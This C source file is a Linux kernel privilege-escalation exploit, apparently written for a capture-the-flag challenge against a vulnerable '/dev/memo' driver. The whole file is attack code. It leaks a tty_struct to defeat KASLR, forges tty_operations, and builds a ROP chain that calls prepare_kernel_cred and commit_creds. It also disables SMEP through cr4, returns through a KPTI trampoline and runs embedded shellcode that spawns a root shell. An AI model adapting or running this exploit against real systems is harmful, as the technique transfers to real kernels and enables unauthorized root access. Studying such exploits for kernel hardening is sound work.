#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<stropts.h>
#include<string.h>
#include<sys/wait.h>
#include<sys/stat.h>
#include<sys/prctl.h>
#include<sys/mman.h>

typedef int __attribute__((regparm(3)))(* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = NULL;
_prepare_kernel_cred prepare_kernel_cred = NULL;

void get_root(void)
{
	commit_creds(prepare_kernel_cred(0));
}


unsigned long read64Address(int fd, unsigned long address)
{
	unsigned long retval;
	unsigned long v1, v2;
	v1 = ioctl(fd,  0xdeadbeef, address-0x28);
	v2 = ioctl(fd, 0xdeadbeef, address-0x24);
	retval = (v2<<32) | v1;
	return retval;
}

int main()
{
	int fd, ptmx_fd;
	unsigned char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
	fd = open("/dev/memo", O_RDWR|O_NOCTTY);
	if(fd == -1) {
		perror("/dev/memo open failed\n");
		exit(-1);
	}

	ptmx_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	if(ptmx_fd == -1){
		perror("/dev/ptmx open failed\n");
		exit(-1);
	}

	write(ptmx_fd, "AAAAAAAA", 8);
	lseek(fd, 0x400-0x8, SEEK_SET);

	char leaked_buf[0x400];
	char magic[16];
	strcpy(magic, "AAAABBBBCCCCDDD");
	if(prctl(PR_SET_NAME, magic)<0)
	{
		perror("prctl\n");
		exit(-1);
	}


	if(read(fd, leaked_buf, 0x400)<0)
	{
		perror("leak tty_struct failed:");
		exit(-1);
	}
	unsigned long *tty_struct = leaked_buf + 8;
	unsigned long leak_value = tty_struct[0x56];
	unsigned long devValue = tty_struct[1];
	unsigned long driverValue = tty_struct[2];
	unsigned long kernelBaseAddr;
	printf("leak_value: 0x%lx\n", leak_value);
	kernelBaseAddr = leak_value - 0x8140e7d0;
	printf("kernel base address: 0x%lx\n", kernelBaseAddr);
	if(kernelBaseAddr & (0x1000 - 1))
	{
		printf("please try again\n");
		return 0;
	}

	unsigned long ttyBaseAddress = tty_struct[7] - 0x38;
	unsigned long fdBaseAddress = ttyBaseAddress - 0x400;
	printf("tty struct base address: 0x%lx\n", ttyBaseAddress);
	printf("fd base address: 0x%lx\n", fdBaseAddress);
	

	if(lseek(fd, 0x400-8, SEEK_SET)<0)
	{
		perror("lseek failed: ");
		exit(-1);
	}

	//getchar();
	unsigned long tty_operations[0x80] = {0};
	for(int i = 0; i<0x80; i++){
		tty_operations[i] = 0xffff424241414141+i;
	}

	// set ioctl;
	// mov eax, [rdx+0x28] gadget 
	tty_operations[12] = kernelBaseAddr + 0x81051543;

	// mov esp, 0xf6000000; ret
	tty_operations[12] = kernelBaseAddr + 0x818be1e4;

	//leave; ret;
	tty_operations[12] = kernelBaseAddr + 0x81008ae7;
	unsigned long *u_code = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE,-1, 0);
	if(u_code == MAP_FAILED){
		perror("mmap code");
		exit(-1);
	}
	unsigned long *u_stack = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN, -1, 0);
	if(u_stack == MAP_FAILED){
		perror("mmap stack");
		exit(-1);
	}
	memcpy(u_code, code, sizeof(code));



	write(ptmx_fd, tty_operations, sizeof(tty_operations));

	//ret
	tty_struct[1] = kernelBaseAddr + 0x81008ae8;

	//add rsp, 0x10; ret  stack massage
	tty_struct[2] = kernelBaseAddr + 0x81021d0f;

	//fale ioctl operations pointer
	tty_struct[3] = ttyBaseAddress + 0x800;

	//real ROP starts from here
	//pop rdi; ret;
	int i = 5;
	tty_struct[i++] = kernelBaseAddr + 0x813831dc;
	tty_struct[i++] = 0x6f0;
	//mov rc4, rdi; push rdx; popfq; ret
	tty_struct[i++] = kernelBaseAddr + 0x8104b6a1;
	//pop rdi; ret;
	tty_struct[i++] = kernelBaseAddr + 0x813831dc;
	tty_struct[i++] = 0;
	//prepare_kernel_cred
	tty_struct[i++] = kernelBaseAddr + 0x8107bb50;
	
	//mov rcx, rax; mov rax, rcx; pop rbx; pop rbp; ret;
	tty_struct[i++] = kernelBaseAddr + 0x8115d98d;
	tty_struct[i++] = 0;
	tty_struct[i++] = 0;

	//pop rdx; ret;
	tty_struct[i++] = kernelBaseAddr + 0x81738be4;
	tty_struct[i++] = 0;

	//mov rdi, rcx; sub rdi, rdx; mov rax, rdi; ret;
	tty_struct[i++] = kernelBaseAddr + 0x810c1cef;



	//commits_cred
	tty_struct[i++] = kernelBaseAddr + 0x8107b8b0;


	//kpti trampoline
	tty_struct[i++] = kernelBaseAddr + 0x81a00a45;
	tty_struct[i++] = 0x30303030;
	tty_struct[i++] = 0x31313131;
	tty_struct[i++] = (unsigned long)u_code;
	tty_struct[i++] = 0x33;
	tty_struct[i++] = 0x246;
	tty_struct[i++] = (unsigned long)u_stack;
	tty_struct[i++] = 0x2b;



	if(write(fd, leaked_buf, 0x100)<0)
	{
		perror("overwrite file tty_struct:");
		exit(-1);
	}

	ioctl(ptmx_fd,  0xdeadbeef, 0x28);
	return 0;
}
